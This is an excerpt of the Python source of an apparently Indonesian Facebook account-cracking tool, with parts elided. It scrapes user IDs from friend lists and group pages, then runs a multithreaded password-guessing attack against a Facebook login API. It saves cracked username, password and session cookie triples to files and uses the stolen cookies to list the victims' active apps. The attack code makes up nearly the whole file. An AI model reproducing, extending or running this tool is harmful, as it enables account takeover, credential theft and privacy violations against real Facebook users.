...
[{color_text}04{K2}].𝐂𝐫𝐚𝐜𝐤 𝐞𝐦𝐚𝐢𝐥 𝐟𝐛       [{color_text}08{K2}].𝐂𝐫𝐚𝐜𝐤 𝐨𝐩𝐬𝐢 𝐜𝐩 𝐟𝐛""",width=80,padding=(0,6),style=f"{color_panel}"))
	...
	if menu in["1","01"]:
		...
		if user in["Me","me"]:
			user = GetUser()
		Dump_Publik(f"https://m.facebook.com/{user}?v=friends")
		atursandi()
	elif menu in["3","03"]:
		...
		Dump_MemberGrup(f"https://mbasic.facebook.com/groups/{user}")
		atursandi()
	elif menu in["8","08"]:
	...
	try:
		...
		for x in data.find_all("a",href=True):
			if "Lihat Postingan Lainnya" in x.text:
				Dump_MemberGrup("https://mbasic.facebook.com"+x.get("href"))
	except:pass
...
###----------[ DUMP EMAIL ]---------- ###
def Dump_Email(nama,format,limit):
	try:
...
def manual(pw):
	...
	prints(Panel(f"""{K2}berhasil crack total {len(tampung)} id, dengan hasil OK : {H2}{len(ok)}{P2} CP : {K2}{len(cp)}{P2}""",width=80,padding=(0,8),style=f"{color_panel}"))
	sys.exit()
		...
		with ThreadPoolExecutor(max_workers=30) as fall:
			...
			for data in tampung:
				try:
					...
					fall.submit(metode_api,user,pwx)
	prints(Panel(f"""{K2}berhasil crack total {len(tampung)} id, dengan hasil OK : {H2}{len(ok)}{B2} CP : {K2}{len(cp)}{B2}""",width=80,padding=(0,8),style=f"{color_panel}"))
	sys.exit()
							
###----------[ METODE API ]---------- ###
def metode_api(email,pwx):
	prog.update(des,description=f" {H2}•{K2} HackFB{K2} {str(loop)}/{len(tampung)} OK : {H2}{len(ok)}{B2} CP : {M2}{len(cp)}{B2}")
	prog.advance(des)
	try:
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in post.text and "EAA" in post.text:
				...
				if user in ok or user in cp:
					...
					if "muncul" in apk:
						...
						open(f"OK/{hari_ini}.txt","a").write(f"{user}|{pw}|{cookie}\n")
						break
				...
				prog.update(des,description=f" {H2}•{P2} crack {M2}spam{P2} {str(loop)}/{len(tampung)} CP : {H2}{len(ok)}{P2} OK : {H2}{len(cp)}{P2}")
				prog.advance(des)
				time.sleep(30)
			else:continue
	except ConnectionError:
...
###----------[ PRINT SIMPAN HASIL ]---------- ###
def simpan_hasil():
	prints(Panel(f"""\r{P2}hasil crack ok tersimpan ke : OK/{hari_ini}.txt
			  {P2}hasil crack ok tersimpan ke : CP/{hari_ini}.txt""",width=80,padding=(0,10),style=f"{color_panel}"))
	
###----------[ PRINT MUNCUL APK ]---------- ###
def get_apk(user,pw,cookie):
	try:
		url = ses.get("https://mbasic.facebook.com/",cookies={"cookie": cookie}).text
		if "Apa yang Anda pikirkan sekarang" in url:
			pass
	...
	apkaktif("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookie)
	if len(aktif)==0:
	...
	apkkadaluwarsa("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookie)
